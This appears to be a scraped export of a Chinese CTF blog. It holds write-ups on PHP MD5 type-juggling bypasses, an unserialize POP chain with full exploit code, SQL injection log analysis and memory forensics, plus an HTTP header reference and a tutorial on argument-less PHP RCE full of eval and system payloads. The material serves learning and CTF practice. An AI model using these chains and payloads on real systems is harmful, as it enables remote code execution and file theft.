&lt;?phphighlight_file(__FILE__);include_once(&#x27;flag.php&#x27;);if(isset($_POST[&#x27;a&#x27;])&amp;&amp;!preg_match(&#x27;/[0-9]/&#x27;,$_POST[&#x27;a&#x27;])&amp;&amp;intval($_POST[&#x27;a&#x27;]))&#123; if(isset($_POST[&#x27;b1&#x27;])&amp;&amp;$_POST[&#x27;b2&#x27;])&#123; if($_POST[&#x27;b1&#x27;]!=$_POST[&#x27;b2&#x27;]&amp;&amp;md5($_POST[&#x27;b1&#x27;])===md5($_POST[&#x27;b2&#x27;]))&#123; if($_POST[&#x27;c1&#x27;]!=$_POST[&#x27;c2&#x27;]&amp;&amp;is_string($_POST[&#x27;c1&#x27;])&amp;&amp;is_string($_POST[&#x27;c2&#x27;])&amp;&amp;md5($_POST[&#x27;c1&#x27;])==md5($_POST[&#x27;c2&#x27;]))&#123; echo $flag; &#125;else&#123; echo &quot;yee&quot;; &#125; &#125;else&#123; echo &quot;nop&quot;; &#125; &#125;else&#123; echo &quot;go on&quot;; &#125;&#125;else&#123; echo &quot;let&#x27;s get some php&quot;;&#125;?&gt; # let&#x27;s get some php 这题要满足三个条件 a、b1 和 b2、c1 和 c2 这里可以使用数组绕过 1a[]=0 b1 和 b2 也可以使用数组绕过 1a[]=0&amp;b1[]=1&amp;b2[]=2 最后这个 c1 和 c2 就是 md5 弱比较 NSSCTF","categories":[{"name":"NSSCTF","slug":"NSSCTF","permalink":"https://dr4x3zz.github.io/categories/NSSCTF/"}],"tags":[{"name":"NSSCTF","slug":"NSSCTF","permalink":"https://dr4x3zz.github.io/tags/NSSCTF/"}]},{"title":"鲲鹏杯wp","slug":"鲲鹏杯wp","date":"2023-04-23T15:51:21.000Z","updated":"2024-11-08T09:58:48.142Z","comments":true,"path":"2023/04/23/鲲鹏杯wp/","link":"","permalink":"https://dr4x3zz.github.io/2023/04/23/%E9%B2%B2%E9%B9%8F%E6%9D%AFwp/","excerpt":"菜狗把自己写了的题目和知道的几道题的解法记录一下","text":"菜狗把自己写了的题目和知道的几道题的解法记录一下 # web # signin_for_web 根据提示 php 版本很重要，所以去百度 php7.2.21 版本。 这个 Bug 存在于 PHP Built-in Server 中。PHP Built-in Server 在解析 TCP 数据流时，对于两个 HTTP 请求，在第二次请求时，如果请求一个非 PHP 后缀的文件服务器 会认为这是一个静态文件，所以将这个文件直接读取并返回。但这个过程中存在一个逻辑问 题，就是在解析第一个请求时遗留下来的 client-&gt;request.path_translated 没有被清理，而这 个变量指向的就是第一个请求的文件绝对路径。 发现该版本有远程源代码泄露的问题，根据https://buaq.net/go-147962.html 的提示，用 burp 对网站进行抓包、改包，这几个换行也是非常重要的不能少 改包 flag 内容 base64 加密一下就可以了 # ezpop 源码 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970&lt;?phpclass A&#123; public $ad1; public $ad2; function evil() &#123; echo new $this-&gt;ad1($this-&gt;ad2); &#125; public function __invoke() &#123; $this-&gt;ad1-&gt;change(); &#125;&#125;class B&#123; public $func; public function __destruct() &#123; echo $this-&gt;func . &#x27;Itisok&#x27;; &#125; public function sear() &#123; ($this-&gt;func)(); &#125; public function __call($a, $b) &#123; echo $this-&gt;func-&gt;get_flag(); &#125;&#125;class C&#123; public $stt; public function __toString() &#123; $this-&gt;stt-&gt;sear(); return &#x27;fine&#x27;; &#125;&#125;class D&#123; public $args; public function sear() &#123; ($this-&gt;args)(); &#125; public function get_flag() &#123; eval(&#x27;#&#x27; . $this-&gt;args); &#125;&#125;if (isset($_POST[&#x27;cmd&#x27;])) &#123; unserialize(base64_decode($_POST[&#x27;cmd&#x27;]));&#125; else &#123; highlight_file(__FILE__);&#125; 链子为 B:__destruct() -&gt; C:__toString() -&gt; B:sear() -&gt; A:__invoke() -&gt; B:__call() -&gt; D:get_flag() , __destruct() 为起点，发现 echo，可以将类作为字符串打印，因此触发 __toString() ，触发 __toString() 后调用 sear() ， sear() 可以把类作为函数调用，触发 __invoke() ， __invoke() 中调用 了不存在的类 change() ，因此可以触发 __call() ，最后 __call() 调用 get_flag() ，进行任意代码执行。在 eval 中还有一个绕过，用换行符就行。最后注意 cat flag.php 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566&lt;?phpclass A&#123; public $ad1; public $ad2; function evil() &#123; echo new $this-&gt;ad1($this-&gt;ad2); &#125; public function __invoke() &#123; $this-&gt;ad1-&gt;change(); &#125;&#125;class B&#123; public $func; public function __destruct() &#123; echo $this-&gt;func . &#x27;Itisok&#x27;; &#125; public function sear() &#123; ($this-&gt;func)(); &#125; public function __call($a, $b) &#123; echo $this-&gt;func-&gt;get_flag(); &#125;&#125;class C&#123; public $stt; public function __toString() &#123; $this-&gt;stt-&gt;sear(); return &#x27;fine&#x27;; &#125;&#125;class D&#123; public $args; public function sear() &#123; ($this-&gt;args)(); &#125; public function get_flag() &#123; eval(&#x27;#&#x27; . $this-&gt;args); &#125;&#125;$a=new A();$b=new B();$c=new C();$d=new D();$b2=new B();$b3=new B();$d-&gt;args=&quot;\\n system(&#x27;cat flag.php&#x27;);&quot;;$b3-&gt;func=$d;$a-&gt;ad1=$b3;$b2-&gt;func=$a;$c-&gt;stt=$b2;$b-&gt;func=$c;echo base64_encode(serialize($b)); Flag：flag # MISC # ezlog 下载附件用 nopated++ 打开 url 解码 可以看到这是 sql 注入基于的时间注入时间同秒或者一秒这样的小差距都算是没问题的 先自己用眼睛找 flag 找了两三遍都是错的，想自己尝试写脚本但是不知道怎么入手，网上找脚本 链接：https://blog.csdn.net/qq_41420747/article/details/94147030 123456789101112131415161718import reimport urllibfile = open(&#x27;log.txt&#x27;,&#x27;r&#x27;)ans = &quot;&quot;req = file.readlines()req = req[275:1842]for i in range(len(req)): if &quot;[01/Mar/2019&quot; in req[i]: if abs(int(req[i-1].split(&#x27;[01/Mar/2019&#x27;)[1][7:9]) - int(req[i].split(&#x27;[01/Mar/2019&#x27;)[1][7:9]))&lt;3: tmp = req[i-1].split(&#x27;=binary(\\&#x27;&#x27;)[1][0:3] print(i+275) if &#x27;\\&#x27;)&#x27; in tmp: ans += tmp[0] else: ans += tmpprint(ans) 把日志内容复制到 log.txt 里面就好了，跑一下脚本获取到 flag # FORENSICS # signin_for_forensics 工具 010editor-desktop、volatility 先获取获取系统信息 中间我还尝试查看所有文件、用户、进程都没有什么实质性的进展 查看浏览器记录 可以看到有一个 fllllag.txt 的文件，filescan 联合 grep 获取物理地址 Dumpfiles 提取文件 可以看到这个目录下多了一个 file.None…… 的文件用 010editor 查看这个.dat 文件 得到 flag 直接复制","categories":[{"name":"ctf","slug":"ctf","permalink":"https://dr4x3zz.github.io/categories/ctf/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://dr4x3zz.github.io/tags/ctf/"}]},{"title":"HTTP发送头Headers整理","slug":"HTTP发送头Headers整理","date":"2023-04-20T16:51:19.000Z","updated":"2023-04-21T17:21:26.000Z","comments":true,"path":"2023/04/21/HTTP发送头Headers整理/","link":"","permalink":"https://dr4x3zz.github.io/2023/04/21/HTTP%E5%8F%91%E9%80%81%E5%A4%B4Headers%E6%95%B4%E7%90%86/","excerpt":"刷 buuctf 的时候遇到一道 http 1 的题目目前还没记录在博客里，里面涉及到这个知识所以归纳一下","text":"刷 buuctf 的时候遇到一道 http 1 的题目目前还没记录在博客里，里面涉及到这个知识所以归纳一下 学习链接：https://blog.csdn.net/weixin_51735061/article/details/123647266 # http — 请求 header 大全 Header 解释 示例 Accept 指定客户端可以接收的内容类型 Accept: text/plain, text/html Accept-Charset 浏览器能够接受的字符编码集。 Accept-Charset: iso-8859-5 Accept-Encoding 指定浏览器能够支持的 web 服务器返回内容压缩编码类型。 Accept-Encoding: compress, gzip Accept-Language 浏览器可接受的语言 Accept-Language: en,zh Accept-Ranges 能够请求网页实体的一个或者多个子范围字段 Accept-Ranges: bytes Authorization HTTP 受权的受权证书 Authorization: Basic QWxhZGRpbjpvcGVuIHNlc2FtZQ== Authorization HTTP 受权的受权证书 Authorization: Basic QWxhZGRpbjpvcGVuIHNlc2FtZQ== Cache-Control 指定请求和响应遵循的缓存机制 Cache-Control: no-cache Connection 表示是否须要持久链接。（HTTP 1.1 默认进行持久链接） Connection: close Cookie HTTP 请求发送时，会把保存在该请求域名下的全部 cookie 值一块儿发送给 web 服务器。 Cookie: $Version=1; Skin=new; Content-Length 请求的内容长度 Content-Length: 348 Content-Type 请求的与实体对应的 MIME 信息 Content-Type: application/x-www-form-urlencoded Date 请求发送的日期和时间 Date: Tue, 15 Nov 2010 08:12:31 GMT Expect 请求的特定的服务器行为 Expect: 100-continue From 发出请求的用户的 Email From: user@email.com Host 指定请求的服务器的域名和端口号 Host: www.zcmhi.com If-Match 只有请求内容与实体相匹配才有效 If-Match: “737060cd8c284d8af7ad3082f209582d” If-Modified-Since 若是请求的部分在指定时间以后被修改则请求成功，未被修改则返回 304 代码 If-Modified-Since: Sat, 29 Oct 2010 19:43:31 GMT If-None-Match 若是内容未改变返回 304 代码，参数为服务器先前发送的 Etag，与服务器回应的 Etag 比较判断是否改变 If-None-Match: “737060cd8c284d8af7ad3082f209582d” If-Range 若是实体未改变，服务器发送客户端丢失的部分，不然发送整个实体。参数也为 Etag If-Range: “737060cd8c284d8af7ad3082f209582d” If-Unmodified-Since 只在实体在指定时间以后未被修改才请求成功 If-Unmodified-Since: Sat, 29 Oct 2010 19:43:31 GMT If-Unmodified-Since 只在实体在指定时间以后未被修改才请求成功 If-Unmodified-Since: Sat, 29 Oct 2010 19:43:31 GMT Proxy-Authorization 链接到代理的受权证书 Proxy-Authorization: Basic QWxhZGRpbjpvcGVuIHNlc2FtZQ== Range 只请求实体的一部分，指定范围 Range: bytes=500-999 Referer 先前网页的地址，当前请求网页紧随其后，即来路 Referer: http://www.zcmhi.com/archives/71.html TE 客户端愿意接受的传输编码，并通知服务器接受接受尾加头信息 TE: trailers,deflate;q=0.5 Upgrade 向服务器指定某种传输协议以便服务器进行转换（若是支持） Upgrade: HTTP/2.0, SHTTP/1.3, IRC/6.9, RTA/x11 User-Agent User-Agent 的内容包含发出请求的用户信息 User-Agent: Mozilla/5.0 (Linux; X11) Via 通知中间网关或代理服务器地址，通讯协议 Via: 1.0 fred, 1.1 nowhere.com (Apache/1.1) Warning 关于消息实体的警告信息 Warn: 199 Miscellaneous warning X-Forwarded-For 用来说明从哪里来的，一般用来内网伪装 X-Forwarded-For: 127.0.0.1 buuctf 那一道题用到的就是更改 Referer、User-Agent、X-Forwarded-For X-Forwarded-For：简称 XFF 头，它代表客户端，也就是 HTTP 的 请求端真实的 IP ，只有在通过了 HTTP 代理或者负载均衡服务器时才会添加该项。 # http — 响应 header 大全 Header 解释 示例 Accept-Ranges 代表服务器是否支持指定范围请求及哪一种类型的分段请求 Accept-Ranges: bytes Age 从原始服务器到代理缓存造成的估算时间（以秒计，非负） Age: 12 Allow 对某网络资源的有效的请求行为，不容许则返回 405 Allow: GET, HEAD Cache-Control 告诉全部的缓存机制是否能够缓存及哪一种类型 Cache-Control: no-cache Content-Encoding web 服务器支持的返回内容压缩编码类型。 Content-Encoding: gzip Content-Language 响应体的语言 Content-Language: en,zh Content-Length 响应体的长度 Content-Length: 348 Content-Location 请求资源可替代的备用的另外一地址 Content-Location: /index.htm Content-MD5 返回资源的 MD5 校验值 Content-MD5: Q2hlY2sgSW50ZWdyaXR5IQ== Content-Range 在整个返回体中本部分的字节位置 Content-Range: bytes 21010-47021/47022 Content-Type 返回内容的 MIME 类型 Content-Type: text/html; charset=utf-8 Date 原始服务器消息发出的时间 Date: Tue, 15 Nov 2010 08:12:31 GMT ETag 请求变量的实体标签的当前值 ETag: “737060cd8c284d8af7ad3082f209582d” Expires 响应过时的日期和时间 Expires: Thu, 01 Dec 2010 16:00:00 GMT Last-Modified 请求资源的最后修改时间 Last-Modified: Tue, 15 Nov 2010 12:45:26 GMT Location 用来重定向接收方到非请求 URL 的位置来完成请求或标识新的资源 Location: http://www.zcmhi.com/archives/94.html Pragma 包括实现特定的指令，它可应用到响应链上的任何接收方 Pragma: no-cache Proxy-Authenticate 它指出认证方案和可应用到代理的该 URL 上的参数 Proxy-Authenticate: Basic refresh 应用于重定向或一个新的资源被创造，在 5 秒以后重定向（由网景提出，被大部分浏览器支持） Refresh: 5; url=http://www.zcmhi.com/archives/94.html Retry-After 若是实体暂时不可取，通知客户端在指定时间以后再次尝试 Retry-After: 120 Server web 服务器软件名称 Server: Apache/1.3.27 (Unix) (Red-Hat/Linux) Set-Cookie 设置 Http Cookie Set-Cookie: UserID=JohnDoe; Max-Age=3600; Version=1 Trailer 指出头域在分块传输编码的尾部存在 Trailer: Max-Forwards Transfer-Encoding 文件传输编码 Transfer-Encoding:chunked Vary 告诉下游代理是使用缓存响应仍是从原始服务器请求 Vary: * Via 告知代理客户端响应是经过哪里发送的 Via: 1.0 fred, 1.1 nowhere.com (Apache/1.1) Warning 警告实体可能存在的问题 Warning: 199 Miscellaneous warning WWW-Authenticate 代表客户端请求实体应该使用的受权方案 WWW-Authenticate: Basic # 请求方法大全 方法 描述 GET 发送请求来获得服务器上的资源，请求体中不会包含请求数据，请求数据放在协议头中。另外 get 支持快取、缓存、可保留书签等。幂等 POST 和 get 一样很常见，向服务器提交资源让服务器处理，比如提交表单、上传文件等，可能导致建立新的资源或者对原有资源的修改。提交的资源放在请求体中。不支持快取。非幂等 HEAD 本质和 get 一样，但是响应中没有呈现数据，而是 http 的头信息，主要用来检查资源或超链接的有效性或是否可以可达、检查网页是否被串改或更新，获取头信息等，特别适用在有限的速度和带宽下。 PUT 和 post 类似，html 表单不支持，发送资源与服务器，并存储在服务器指定位置，要求客户端事先知道该位置；比如 post 是在一个集合上（/province），而 put 是具体某一个资源上（/province/123）。所以 put 是安全的，无论请求多少次，都是在 123 上更改，而 post 可能请求几次创建了几次资源。幂等 DELETE 请求服务器删除某资源。和 put 都具有破坏性，可能被防火墙拦截。如果是 https 协议，则无需担心。幂等 CONNECT HTTP/1.1 协议中预留给能够将连接改为管道方式的代理服务器。就是把服务器作为跳板，去访问其他网页然后把数据返回回来，连接成功后，就可以正常的 get、post 了。 OPTIONS 获取 http 服务器支持的 http 请求方法，允许客户端查看服务器的性能，比如 ajax 跨域时的预检等。 TRACE 回显服务器收到的请求，主要用于测试或诊断。一般禁用，防止被恶意攻击或盗取信息。","categories":[{"name":"ctfweb","slug":"ctfweb","permalink":"https://dr4x3zz.github.io/categories/ctfweb/"}],"tags":[{"name":"ctfweb","slug":"ctfweb","permalink":"https://dr4x3zz.github.io/tags/ctfweb/"}]},{"title":"无参数读取文件和rce总结","slug":"无参数读取文件和rce总结","date":"2023-04-20T16:50:40.000Z","updated":"2024-11-08T10:00:25.368Z","comments":true,"path":"2023/04/21/无参数读取文件和rce总结/","link":"","permalink":"https://dr4x3zz.github.io/2023/04/21/%E6%97%A0%E5%8F%82%E6%95%B0%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E5%92%8Crce%E6%80%BB%E7%BB%93/","excerpt":"做鲲鹏杯测试平台时遇到了一道无参数读取文件，学习一下相关知识，做个总结","text":"做鲲鹏杯测试平台时遇到了一道无参数读取文件，学习一下相关知识，做个总结 学习链接：https://zhuanlan.zhihu.com/p/157431794 感觉全篇都是精华，而且很具体，没办法去缩减基本照搬过来记录一下 # 前言 什么是无参数？ 顾名思义，就是只使用函数，且函数不能带有参数，这里有种种限制：比如我们选择的函数必须能接受其括号内函数的返回值；使用的函数规定必须参数为空或者为一个参数等 # 代码解析 接下来，从代码开始讲解无参数读文件和 RCE 的具体技巧，帮助读者熟悉 PHP 的各种函数、记住无参数读文件和 RCE 的各类方法： 例题： 123456&lt;?phphighlight_file(__FILE__);if(&#x27;;&#x27; === preg_replace(&#x27;/[^\\W]+\\((?R)?\\)/&#x27;, &#x27;&#x27;, $_GET[&#x27;code&#x27;])) &#123; eval($_GET[&#x27;code&#x27;]);&#125;?&gt; 代码解析 1preg_replace(&#x27;/[^\\W]+\\((?R)?\\)/&#x27;, &#x27;&#x27;, $_GET[&#x27;code&#x27;]) 这里使用 preg_replace() 替换匹配到的字符为空， \\w 匹配字母、数字和下划线，等价于 [^A-Za-z0-9_] ，然后 (?R)? 这个意思为递归整个匹配模式 所以正则的含义就是匹配无参数的函数，内部可以无限嵌套相同的模式（无参数函数），将匹配的替换为空，判断剩下的是否只有 ; 举个例子： a(b(c())); 可以使用，但是 a('b') 或者 a('b','c') 这种含有参数的都不能使用（我的理解时’b’和’c’在函数里会被作为参数） 所以我们要使用无参数的函数进行文件读取或者命令执行 # 无参数任意文件读取 # 查看当前目录文件名 正常的， print_r(scandir('.')); 可以用来查看当前目录所有文件名，而 . 是不包含在 \\w 里面导致其它函数都被转为空格，这个点没有办法被替换为空格，使得 ; 没法等于 .; 没办法执行下一个 eval 函数，所以要想办法用函数来代替 . # 1.localeconv() localeconv() 返回一包含本地数字及货币格式信息的数组。而数组第一项就是 &quot;.&quot; （后续出现的 . 都用双引号包裹，方便识别） 要怎么取到这个点呢，另一个函数： current() 返回数组中的单元，默认取第一个值 current (localeconv ()) 永远都是个点 print_r(scandir(current(localeconv()))); 或者使用 print_r(scandir(pos(localeconv()))); ， pos 是 current 的别名 如果都被过滤还可以使用 reset() ，该函数返回数组第一个单元的值，如果数组为空则返回 FALSE # 2.chr(46) chr(46) 就是字符 &quot;.&quot; 要构造 46，有几个方法： 12345chr(rand()) (不实际，看运气)chr(time())chr(current(localtime(time()))) chr(time()) ： 1chr()`函数以256为一个周期，所以`chr(46)`,`chr(302)`,`chr(558)`都等于`&quot;.&quot; 所以使用 chr(time()) ，一个周期必定出现一次 &quot;.&quot; chr(current(localtime(time()))) ： 数组第一个值每秒 + 1，所以最多 60 秒就一定能得到 46，用 current(pos) 就能获得 &quot;.&quot; # 3.phpversion() phpversion() 返回 PHP 版本，如 5.5.9 floor(phpversion()) 返回 5 sqrt(floor(phpversion())) 返回 2.2360679774998 tan(floor(sqrt(floor(phpversion())))) 返回 -2.1850398632615 cosh(tan(floor(sqrt(floor(phpversion()))))) 返回 4.5017381103491 sinh(cosh(tan(floor(sqrt(floor(phpversion())))))) 返回 45.081318677156 ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))) 返回 46 chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion())))))))) 返回 &quot;.&quot; # 4.crypt() hebrevc(crypt(arg)) 可以随机生成一个 hash 值，第一个字符随机是 $ (大概率) 或者 &quot;.&quot; (小概率) 然后通过 chr(ord()) 只取第一个字符 ps： ord() 返回字符串中第一个字符的 Ascii 值 1print_r(scandir(chr(ord(hebrevc(crypt(time()))))));//（多刷新几次） 同理： strrev(crypt(serialize(array()))) 也可以得到 &quot;.&quot; ，只不过 crypt(serialize(array())) 的点出现在最后一个字符，需要使用 strrev() 逆序，然后使用 chr(ord()) 获取第一个字符 1print_r(scandir(chr(ord(strrev(crypt(serialize(array()))))))); PHP 的函数如此强大，获取 &quot;.&quot; 的方法肯定还有许多 正常的，我们还可以用 print_r(scandir('绝对路径')); 来查看当前目录文件名 获取绝对路径可用的有 getcwd() 和 realpath('.') 所以我们还可以用 print_r(scandir(getcwd())); 输出当前文件夹所有文件名 # 读取当前目录文件 通过前面的方法输出了当前目录文件名，如果文件不能直接显示，比如 PHP 源码，我们还需要使用函数读取： 前面的方法输出的是数组，文件名是数组的值，那我们要怎么取出想要读取文件的数组呢： 查询 PHP 手册发现： 手册里有这些方法，如果要获取的数组是最后一个我们可以用： show_source(end(scandir(getcwd()))); 或者用 readfile 、 highlight_file 、 file_get_contents 等读文件函数都可以（使用 readfile 和 file_get_contents 读文件，显示在源码处） ps： readgzfile() 也可读文件，常用于绕过过滤 介绍一个函数： array_reverse() 以相反的元素顺序返回数组 文件本来在最后一位，反过来就成为第一位，可以直接用 current(pos) 读取 1show_source(current(array_reverse(scandir(getcwd())))); 如果是倒数第二个我们可以用： 1show_source(next(array_reverse(scandir(getcwd())))); 如果不是数组的最后一个或者倒数第二个呢？ 我们可以使用 array_rand(array_flip()) ， array_flip() 是交换数组的键和值， array_rand() 是随机返回一个数组 所以我们可以用： 1show_source(array_rand(array_flip(scandir(getcwd())))); 或者： 1show_source(array_rand(array_flip(scandir(current(localeconv()))))); （可以自己结合前面总结的构造 &quot;.&quot; 的方法切合实际过滤情况读取，后文就只列举简单的语句） 多刷新几次，就读到了正着数或者倒着数都是第三位的 flag 文件 # 查看上一级目录文件名 再介绍几个函数： dirname() ：返回路径中的目录部分，比如： 从图中可以看出，如果传入的值是绝对路径（不包含文件名），则返回的是上一层路径，传入的是文件名绝对路径则返回文件的当前路径 chdir() ：改变当前工作目录 # dirname () 方法 1print_r(scandir(dirname(getcwd()))); //查看上一级目录的文件 构造 &quot;..&quot; print_r(next(scandir(getcwd()))); ：我们 scandir(getcwd()) 出现的数组第二个就是 &quot;..&quot; ，所以可以用 next() 获取 1print_r(scandir(next(scandir(getcwd()))));//也可查看上级目录文件 结合上文的一些构造都是可以获得 &quot;..&quot; 的 ： 1next(scandir(chr(ord(hebrevc(crypt(time())))))) # 读取上级目录文件 直接 print_r(readfile(array_rand(array_flip(scandir(dirname(getcwd())))))); 是不可以的，会报错，因为默认是在当前工作目录寻找并读取这个文件，而这个文件在上一层目录，所以要先改变当前工作目录 前面写到了 chdir() ，使用： 1show_source(array_rand(array_flip(scandir(dirname(chdir(dirname(getcwd()))))))); 即可改变当前目录为上一层目录并读取文件 如果不能使用 dirname() ，可以使用构造 &quot;..&quot; 的方式切换路径并读取： 但是这里切换路径后 getcwd() 和 localeconv() 不能接收参数，因为语法不允许，我们可以用之前的 hebrevc(crypt(arg)) 这里 crypt() 和 time() 可以接收参数，于是构造： 12345show_source(array_rand(array_flip(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(getcwd())))))))))));或更复杂的：show_source(array_rand(array_flip(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(chr(ord(hebrevc(crypt(phpversion())))))))))))))));还可以用：show_source(array_rand(array_flip(scandir(chr(current(localtime(time(chdir(next(scandir(current(localeconv()))))))))))));//这个得爆破，不然手动要刷新很久，如果文件是正数或倒数第一个第二个最好不过了，直接定位 多刷新几次 还有一种构造方法 if() ：（这种更直观些，并且不需要找可接收参数的函数） 1if(chdir(next(scandir(getcwd()))))show_source(array_rand(array_flip(scandir(getcwd())))); # 查看和读取根目录文件 1print_r(scandir(chr(ord(strrev(crypt(serialize(array()))))))); strrev(crypt(serialize(array()))) 所获得的字符串第一位有几率是 / ，所以使用以上 payload 可以查看根目录文件 但是有权限限制，linux 系统下需要一定的权限才能读到，所以不一定成功 同样的： 1if(chdir(chr(ord(strrev(crypt(serialize(array())))))))print_r(scandir(getcwd())); 也可以查看根目录文件，但是也会受到权限限制，不一定成功 读根目录文件：(也是需要权限) 1if(chdir(chr(ord(strrev(crypt(serialize(array())))))))show_source(array_rand(array_flip(scandir(getcwd())))); # 无参数命令执行 (RCE) 我们可以使用无参数函数任意读文件，也可以执行命令： 既然传入的 code 值不能含有参数，那我们可不可以把参数放在别的地方， code 用无参数函数来接收参数呢？这样就可以打破无参数函数的限制： 首先想到 headers ，因为 headers 我们用户可控，于是在 PHP 手册中搜索： headers 经过查找，发现 getallheaders() 和 apache_request_headers() # getallheaders()&amp;apache_request_headers() getallheaders() 是 apache_request_headers() 的别名函数，但是该函数只能在 Apache 环境下使用 接下来利用方式就多了，任何 header 头部都可利用： 我们可以使用： 123?code=eval(pos(getallheaders()));//headerLeon: phpinfo(); 因为我这里 Leon: phpinfo(); 排在第一位，所以直接用 pos(current的别名) 取第一个数组的值 当然，在系统函数没有禁用的情况下，我们还可以直接使用系统函数： 根据位置的不同，可以结合前文，构造获取不同位置的数组 除了可以获得 headers ，PHP 有个函数可以获得所有 PHP 变量：get_defined_vars () # get_defined_vars() 该函数会返回全局变量的值，如 get、post、cookie、file 数据 这里要注意， leon=&gt;phpinfo(); 在 _GET 数组中，所以需要使用两次取数组值： 第一次： 第二次： 所以，利用 get 传递新变量可以造成命令执行，post、cookie 同理，这里就不演示了 1?leon=phpinfo();&amp;code=eval(pos(pos(get_defined_vars()))); 如何利用 file 变量进行 rce 呢？ 12345678910import requestsfiles = &#123; &quot;system(&#x27;whoami&#x27;);&quot;: &quot;&quot;&#125;#data = &#123;#&quot;code&quot;:&quot;eval(pos(pos(end(get_defined_vars()))));&quot;#&#125;r = requests.post(&#x27;http://127.0.0.1/333/222/111/index.php?code=eval(pos(pos(end(get_defined_vars()))));&#x27;, files=files)print(r.content.decode(&quot;utf-8&quot;, &quot;ignore&quot;)) 这里要注意的是，file 数组在最后一个，需要 end 定位，因为 payload 直接放在文件的名称上，再 pos 两次定位获得文件名 # session_id() session_id() ： 可以用来获取 / 设置 当前会话 ID。 session 需要使用 session_start() 开启，然后返回参数给 session_id() 但是有一点限制：文件会话管理器仅允许会话 ID 中使用以下字符：a-z A-Z 0-9 ,（逗号）和 - 减号） 但是 hex2bin() 函数可以将十六进制转换为 ASCII 字符，所以我们传入十六进制并使用 hex2bin() 即可 123456eval(hex2bin(session_id(session_start())));&gt;&gt;&gt; print&#x27;phpinfo();&#x27;.encode(&#x27;hex&#x27;)706870696e666f28293bCookie: PHPSESSID=706870696e666f28293b # getenv() getenv() ：获取环境变量的值 (在 PHP7.1 之后可以不给予参数) 所以该函数只适用于 PHP7.1 之后版本，否则会出现： Warning: getenv() expects exactly 1 parameter, 0 given in ... 报错 getenv() 可以用来收集信息，实际利用一般无法达到命令执行效果，因为默认的 php.ini 中， variables_order 值为： GPCS 也就是说系统在定义 PHP 预定义变量时的顺序是 GET,POST,COOKIES,SERVER ，没有定义 Environment(E) ，你可以修改 php.ini 文件的 variables_order 值为你想要的顺序，如： &quot;EGPCS&quot; 。这时， $_ENV 的值就可以取得了 我们来看修改后的值：（环境不同，环境变量显示也不同） 对此我们可以加以利用，方法同上文： # 小结 无参数 RCE 和文件读取实际情况下会存在许多过滤，需要自己结合以上方法绕过，主要还是考察对 PHP 函数的熟练程度","categories":[{"name":"ctfweb","slug":"ctfweb","permalink":"https://dr4x3zz.github.io/categories/ctfweb/"}],"tags":[{"name":"ctfweb","slug":"ctfweb","permalink":"https://dr4x3zz.github.io/tags/ctfweb/"}]},{"title":"反序列化","slug":"反序列化","date":"2023-04-20T16:49:19.000Z","updated":"2023-04-30T15:40:30.000Z","comments":true,"path":"2023/04/21/反序列化/","link":"","permalink":"https://dr4x3zz.github.io/2023/04/21/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/","excerpt":"# PHP 反序列化","text":"# PHP 反序列化 # 序列化与反序列化 序列化可以将变量转换为字符串，并且在转换的过程中可以保存 当前变量的值 O:4:“Name”:2: 反序列化可以将序列化生成的字符串转换回变量。 123456 object(Name)#2 (2) &#123; [&quot;username&quot;]=&gt; string(5) &quot;admin&quot; [&quot;password&quot;]=&gt; string(3) &quot;100&quot; &#125; 布尔型：b:value =&gt; b:0 整数型：i:value =&gt; i:1 字符串型：s:length:value =&gt;s:4 “aaaa” 数组型：a::{key, value pairs} =&gt;a:1: 对象型：O: NULL 型： # 序列化 序列化说通俗点就是把一个对象变成可以传输的字符串。 序列化实际是为了传输的方便，以整个对象为单位进行传输，而序列化一个对象将会保存对象的所有变量，但是不会保存对象的方法，只会保存类的名字。如果了解底层的同学可以知道，类中的方法本就不在类中。 而在 php 中，使用函数 serialize () 来返回一个包含字节流的字符串来表示 比如: class S{ public $test=“sd”; } $s=new S (); // 创建一个对象 serialize ($s); // 把这个对象进行序列化 序列化的结果是: O:1:“S”:1: 代表的含义依次是: O: 代表 object 1: 代表对象名字长度为一个字符 S: 对象的名称 1: 代表对象里面有一个变量 s: 数据类型 (string) 4: 变量名称的长度 test: 变量名称 s: 数据类型 2: 变量值的长度 sd: 变量值 顺便说一下 PHP 对不同类型的数据用不同的字母进行标示 a - array b - boolean d - double i - integer o - common object r - reference s - string C - custom object O - class N - null R - pointer reference U - unicode string # 反序列化 反序列化 就是把被序列化的字符串还原为对象，然后在接下来的代码中继续使用。 使用 unserialize () 函数 $u=unserialize(“O:1:“S”:1:{s:4:“test”;s:2:“sd”;}”); echo $u-&gt;test; // 得到的结果为 sd # 魔术方法 123456789101112__construct() //类的构造函数__wakeup() //执行unserialize()时，先会调用这个函数__sleep() //执行serialize()时，先会调用这个函数__destruct() //对象被销毁时触发__call() //在对象上下文中调用不可访问的方法时触发__callStatic() //在静态上下文中调用不可访问的方法时触发__get() //用于从不可访问的属性读取数据或者不存在这个键都会调用此方法__set() //用于将数据写入不可访问的属性__isset() //在不可访问的属性上调用isset()或empty()触发__unset() //在不可访问的属性上使用unset()时触发__toString() //把类当作字符串使用时触发__invoke() //当尝试将对象调用为函数时触发 # 原生类 遍历目录： 1、DirectoryIterator 2、FilesystemIterator 3、GlobIterator 读取文件： 4、SplFileObject 错误类（绕过 hash 比较）： 5、Error 6、Exception 压缩处理类（删除文件）： 7、ZipArchive 进行 SSRF： 8、SoapClient 目前还没有使用过只是蛮记录一下 学习链接：https://zhuanlan.zhihu.com/p/458866772 根据链接里面学习，我的理解是原生类就是 php 自带的大类，可以理解为不用我们 class 定义的一个类，php 自带的 